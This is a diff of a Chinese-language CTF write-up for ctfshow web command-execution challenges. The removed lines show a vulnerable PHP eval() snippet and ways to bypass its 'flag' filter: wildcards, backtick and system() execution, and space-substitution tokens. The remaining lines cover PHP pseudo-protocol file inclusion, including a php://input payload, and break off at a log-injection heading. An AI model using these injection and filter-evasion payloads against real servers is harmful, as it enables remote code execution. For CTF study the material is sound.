@@ -1,53 +1,8 @@
-## ctfshow web入门-命令执行29-36
-
-> 参考自ctfshow题目wp，搜索引擎，AI及其他下面补充  
-伪协议什么时候使用：[博客园师傅a](https://www.cnblogs.com/rpup/p/17609766.html)  
-php伪协议的使用：[学长师傅](https://www.f0rget.cn/index.php/2023/03/07/php%e4%bc%aa%e5%8d%8f%e8%ae%ae/)
-```php
-if(isset($_GET['c'])){
-    $c = $_GET['c'];
-    if(!preg_match("/flag/i", $c)){
-        eval($c);
-    }
-}
-```
-题目中的eval()函数，造成命令执行漏洞  
-cat，tac，less，more等命令都可以查看文件内容，其他欢迎补充
-## 1. 通配符
-绕过文件名/扩展名的限制
-```shell
-tac f*
-cat f?ag.p?p
-less f*
-more f*
-```
-## 2. echo执行命令  
-```php
-echo `ls`
-```
-## 3. system()执行系统命令
-system函数会将参数字符串作为系统命令执行
-```shell
-system("ls")
-```
-echo会将反引号中字符串作为命令执行
-## 4.passthru()代替system()执行系统命令
-```
-passthru('ls')
-```
-## 5.空格绕过
-```bash
-%09     # tab的url编码
-${IFS}  # bash中的分隔符，空格，tab，换行符
-<       # 重定向
-,
-%0a     # 换行 
-```
-## 6. include+php伪协议
-### 6.1 文件包含
+## include+php伪协议
+### 1.1 文件包含
 > 在文件包含时使用php伪协议，常见的文件包含函数如下1 include **2 require** 3 include_once 4 require_once 5 highlight_file 6 show_source **7 file** **8 readfile** 9 file_get_contents 10 file_put_contents 11 fopen  将一个文件的内容包含到另一个文件   
 
-### 6.2 伪协议
+### 1.2 伪协议
 > PHP 伪协议是一种特殊的 PHP 特性，允许在 PHP 中通过类似 URL 的方式来访问各种资源，如文件、数据流等
 > - file://: 允许 PHP 访问本地文件系统中的文件。例如，file:///path/to/file.txt 可以用于读取文件系统中的文本文件。
 > - http:// 或 https://: 允许 PHP 通过 HTTP 或 HTTPS 协议访问远程服务器上的资源。例如，http://example.com/data.txt 可用于获取远程服务器上的数据。
@@ -84,7 +39,7 @@ payload3：**url?c=include$_GET[1];&1=php://input**
 使用post传入命令，命令执行
 
 
-## 7.include+日志注入
+## 2.1 include+日志注入
 > 对于Nginx  
 > 默认的日志文件目录通常如下：
 访问日志（Access Log）：  
